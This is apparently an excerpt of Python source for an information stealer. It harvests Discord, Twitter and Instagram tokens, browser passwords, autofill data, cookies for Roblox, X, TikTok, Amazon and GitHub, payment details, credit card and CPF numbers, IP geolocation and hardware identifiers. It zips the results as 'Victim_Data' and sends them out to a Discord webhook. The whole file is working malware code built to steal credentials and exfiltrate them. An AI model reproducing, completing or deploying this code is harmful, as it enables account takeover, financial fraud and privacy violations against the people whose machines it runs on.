...
def get_coordinates(ip_address):
    try:
        if ip_address and ip_address != "IP not found":
...
def get_user_data(token):
    try:
        ...
        response = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10).json()
        return [
...
def get_personal_data():
    ...
    if ip_address and ip_address != "IP not found":
        ...
        if country == "Country not found":
            try:
                country = safe_urlopen(f"https://ipapi.co/{ip_address}/country_name/") or "Country not found"
                city = safe_urlopen(f"https://ipapi.co/{ip_address}/city/") or "City not found"
            except:
                pass
...
def get_cpu_info():
    try:
        p = Popen("wmic cpu get name", shell=True, stdout=PIPE, stderr=PIPE)
        result = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
        return result.strip() if result.strip() else "CPU info not found"
    except:
...
def send_webhook():
    ...
    if not WEBHOOK_URL or "YOUR_DISCORD_WEBHOOK_URL_HERE" in WEBHOOK_URL:
        print("ERROR: Please set your Discord webhook URL in the WEBHOOK_URL variable")
        return
    ...
    with TemporaryDirectory(dir=".") as td:
        ...
        for sensitive_item in main_info[14]:
        ...
        for cookie in main_info[6]:
            roblox_T.add_row([cookie.get('value', '')])
        
        for _x in main_info[7]:
            x_T.add_row([_x])
        
        for cookie in main_info[8]:
            tiktok_T.add_row([f"{cookie.get('name', '')}: {cookie.get('value', '')}"])
        
        for cookie in main_info[9]:
            amazon_T.add_row([f"{cookie.get('name', '')}: {cookie.get('value', '')}"])
        
        for cookie in main_info[10]:
            github_T.add_row([f"{cookie.get('name', '')}: {cookie.get('value', '')}"])
        ...
        files_names = [
            [os.path.join(td, "Discord_Tokens.txt"), discord_T],
            [os.path.join(td, "Twitter_Tokens.txt"), twitter_T],
            [os.path.join(td, "Instagram_Tokens.txt"), insta_T],
            [os.path.join(td, "Chrome_Passwords.txt"), chrome_Psw_t],
            [os.path.join(td, "Roblox_Cookies.txt"), roblox_T],
            [os.path.join(td, "X_Cookies.txt"), x_T],
            [os.path.join(td, "TikTok_Cookies.txt"), tiktok_T],
            [os.path.join(td, "Amazon_Cookies.txt"), amazon_T],
            [os.path.join(td, "GitHub_Cookies.txt"), github_T],
            [os.path.join(td, "Sensitive_Information.txt"), sensitive_T],
        ]
        ...
        for x_, y_ in files_names:
            if (
                ...
                (y_ == files_names[9][1] and len(main_info[14]) != 0)
            ):
                with open(x_, "w", encoding="utf-8") as wr:
                    wr.write(y_.get_string())

        all_files = [
            os.path.join(td, "Payment_Information.txt"),
        ]
        ...
        enhanced_files = [
            ...
            [os.path.join(td, "all_browser_passwords.json"), main_info[12]],
            [os.path.join(td, "autofill_data.json"), main_info[13]],
            [os.path.join(td, "sensitive_information.json"), main_info[14]],
        ]
        ...
        try:
            ...
            ip_info_value = f"**IP:** {p_lst[0]}\n**Country:** {p_lst[1]}\n**City:** {p_lst[2]}\n"
            
            if len(p_lst) > 3 and p_lst[3] and p_lst[3][0] != 'N/A':
                ip_info_value += f"**Coordinates:** {p_lst[3][0]}, {p_lst[3][1]}\n"
            
            if len(p_lst) > 4 and p_lst[4] and p_lst[4].get('isp') != 'N/A':
                as_info = p_lst[4]
                ip_info_value += f"**ISP:** {as_info.get('isp', 'N/A')}\n"
                if as_info.get('as') != 'N/A':
                    ip_info_value += f"**AS:** {as_info.get('as', 'N/A')}\n"
                if as_info.get('region') != 'N/A':
                    ip_info_value += f"**Region:** {as_info.get('region', 'N/A')}\n"
            
            ip_info_value += f"**MAC:** {gma()}\n**HWID:** {get_hwid()}"
            ...
            total_passwords = sum(len(passwords) for passwords in main_info[12].values()) if main_info[12] else 0
            total_sensitive = len(main_info[14]) if main_info[14] else 0
            
            embed.add_embed_field(
                name="📈 DATA COLLECTION STATS",
                value=f"**Total Cookies:** {total_cookies}\n"
                      f"**Saved Passwords:** {total_passwords}\n"
                      f"**Sensitive Data:** {total_sensitive}\n"
                      f"**Browsers with Data:** {len(main_info[11]) if main_info[11] else 0}",
                inline=False,
            )
            
            embed.add_embed_field(
                name="👤 CAPTURED ACCOUNTS",
                value=f"**Discord:** {len(verified_tokens)}\n"
                      f"**Twitter:** {len(main_info[1])}\n"
                      f"**Instagram:** {len(main_info[2])}\n"
                      f"**Roblox:** {len(main_info[6])}\n"
                      f"**Netflix:** {len(main_info[5])}\n"
                      f"**TikTok:** {len(main_info[8])}\n"
                      f"**Amazon:** {len(main_info[9])}\n"
                      f"**GitHub:** {len(main_info[10])}\n"
                      f"**Passwords:** {len(main_info[4])}",
                inline=False,
            )
            
            cpf_count = sum(1 for item in main_info[14] if item['type'] == 'CPF')
            phone_count = sum(1 for item in main_info[14] if item['type'] == 'Phone Number')
            credit_card_count = sum(1 for item in main_info[14] if item['type'] == 'Credit Card')
            email_count = sum(1 for item in main_info[14] if item['type'] == 'Email')
            
            embed.add_embed_field(
                name="⚠️ SENSITIVE INFORMATION",
                value=f"**CPF Numbers:** {cpf_count}\n"
                      f"**Phone Numbers:** {phone_count}\n"
                      f"**Credit Cards:** {credit_card_count}\n"
                      f"**Email Addresses:** {email_count}",
                inline=False,
            )
            
            card_e = "✅" if any(p[1] == 1 for p in main_info[3]) else "❌"
            paypal_e = "✅" if any(p[1] == 2 for p in main_info[3]) else "❌"
            
            embed.add_embed_field(
                name="💳 PAYMENT INFORMATION",
                value=f"**Debit/Credit Card:** {card_e}\n**PayPal:** {paypal_e}",
                inline=False,
            )
            
            embed.set_footer(text="GitHub: 00ie | Discord: tlwm | Telegram: feicoes")
            embed.set_timestamp()
            
            with open(os.path.join(td, "data.zip"), "rb") as f:
                webhook.add_file(
                    file=f.read(),
                    filename=f"Victim_Data_{os.getenv('UserName')}.zip",
                )
